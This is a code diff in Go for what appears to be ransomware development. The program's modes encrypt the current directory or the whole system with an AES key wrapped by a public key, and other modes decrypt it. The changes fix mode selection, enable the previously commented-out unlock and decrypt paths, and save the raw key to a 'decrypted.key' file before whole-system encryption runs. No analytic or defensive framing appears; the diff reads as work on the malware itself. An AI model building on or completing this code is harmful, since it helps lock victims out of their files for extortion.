@@ -27,14 +27,14 @@ var (
 )
 
 func main() {
-
+	SetModeOfOperation()
 	switch Mode {
 	case "decrypt":
-		// ModeDecrypt()
+		ModeDecrypt()
 	case "lock":
 		ModeLockSystem()
 	case "unlock system":
-		// ModeUnlockSystem()
+		ModeUnlockSystem()
 	default:
 		ModeLockCurrentDir()
 	}
@@ -49,14 +49,15 @@ func SetModeOfOperation() {
 		//check if file exists
 		if _, err := os.Stat(file); err == nil {
 			Mode = mode
-			pl("Mode of operation set to: ", Mode)
-		}
-		if mode == "lock" {
-			os.Stat(filesThatAlterMode["decrypted.key"])
-			Mode = "unlock system"
-
 		}
 	}
+	if Mode == "lock" {
+		//check if "decrypted.key" exists
+		if _, err := os.Stat("decrypted.key"); err == nil {
+			Mode = "unlock system"
+		}
+	}
+	pl("Mode of operation set to: ", Mode)
 }
 
 func ModeDecrypt() {
@@ -76,7 +77,7 @@ func ModeLockCurrentDir() {
 func ModeLockSystem() {
 	//encrypt aes key with public key
 	key, encryptedAESKey := generateAesAndEncryptedAes()
-
+	os.WriteFile("decrypted.key", key, 0644)
 	system.WholeSystemEncrypt(key, encryptedAESKey)
 }
 
@@ -87,7 +88,7 @@ func generateAesAndEncryptedAes() ([]byte, []byte) {
 	return key, encryptedAESKey
 }
 func ModeUnlockSystem() {
-	// AESKey, err := os.ReadFile("decrypted.key")
-	// ErrCheck(err)
-	// system.WholeSystemDecrypt(AESKey)
+	AESKey, err := os.ReadFile("decrypted.key")
+	ErrCheck(err)
+	system.WholeSystemDecrypt(AESKey)
 }
